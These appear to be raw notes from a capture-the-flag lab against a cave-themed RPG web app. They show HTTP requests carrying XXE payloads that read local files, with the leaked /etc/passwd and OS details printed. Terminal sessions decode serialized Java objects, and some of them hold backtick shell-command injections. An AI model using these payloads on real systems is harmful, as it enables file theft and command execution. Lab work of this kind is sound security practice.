search 
attack 
lamp   
matches
walk

--------------

```
POST /action.php HTTP/1.1
Host: 10.48.189.50
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.48.189.50
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.48.189.50/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin sshd:x:105:65534::/run/sshd:/usr/sbin/nologin cave:x:1000:1000:,,,:/home/cave:/bin/bash door:x:1001:1001:,,,:/home/door:/bin/bash skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash
```

--------------

```
POST /action.php HTTP/1.1
Host: 10.48.189.50
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.48.189.50
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.48.189.50/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

action=walk
```

--------------

```
POST /action.php HTTP/1.1
Host: 10.48.189.50
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.48.189.50
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.48.189.50/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////etc/os-release'>]><root>&test;</root>

NAME="Ubuntu" VERSION="20.04 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal
```

----------------

┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAkWW91IHB1bmNoIHRoZSB3YWxsLCBub3RoaW5nIGhhcHBlbnMudAAGYXR0YWNrdAAA" | base64 -d  
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xpt$You punch the wall, nothing happens.tattackt                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAuWW91IGNhbid0IHNlZSBhbnl0aGluZywgdGhlIGNhdmUgaXMgdmVyeSBkYXJrLnQABnNlYXJjaHQAAA==" | base64 -d
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xpt.You can't see anything, the cave is very dark.tsearcht                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAWVGhlcmUncyBub3doZXJlIHRvIGdvLnQABHdhbGt0AAA=" | base64 -d
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xptThere's nowhere to go.twalkt                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAuWW91IGNhbid0IHNlZSBhbnl0aGluZywgdGhlIGNhdmUgaXMgdmVyeSBkYXJrLnQABnNlYXJjaHQAAA==" | base64 -d
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xpt.You can't see anything, the cave is very dark.tsearcht                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAkWW91IHB1bmNoIHRoZSB3YWxsLCBub3RoaW5nIGhhcHBlbnMudAAGYXR0YWNrdAAA" | base64 -d 
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xpt$You punch the wall, nothing happens.tattackt                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABhWW91IGdyYWIgYSBsYW1wLCBhbmQgaXQgZ2l2ZXMgZW5vdWdoIGxpZ2h0IHRvIHNlYXJjaCBhcm91bmQKYGxzO2V4cG9ydCBJTlZFTlRPUlk9bGFtcDokSU5WRU5UT1JZYHQABGxhbXB0AAA=" | base64 -d 
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xptaYou grab a lamp, and it gives enough light to search around
`ls;export INVENTORY=lamp:$INVENTORY`tlampt                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdABUWW91IGZpbmQgYSBib3ggb2YgbWF0Y2hlcywgaXQgZ2l2ZXMgZW5vdWdoIGZpcmUgZm9yIHlvdSB0byBzZWUgdGhhdCB5b3UncmUgaW4gYHB3ZGAudAAHbWF0Y2hlc3QAAA==" | base64 -d
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xptTYou find a box of matches, it gives enough fire for you to see that you're in `pwd`.tmatchest                                                                                                                                                
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAWVGhlcmUncyBub3doZXJlIHRvIGdvLnQABHdhbGt0AAA=" | base64 -d
��srAction��M��;LcommandtLjava/lang/String;Lnameq~Loutputq~xptThere's nowhere to go.twalkt                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB+AAFMAAZvdXRwdXRxAH4AAXhwdAAuWW91IGNhbid0IHNlZSBhbnl0aGluZywgdGhlIGNhdmUgaXMgdmVyeSBkYXJrLnQABnNlYXJjaHQAAA==" | base63 -d                                                                
Command 'base63' not found, did you mean:
  command 'base64' from deb coreutils
Try: sudo apt install <deb name>

-----------------
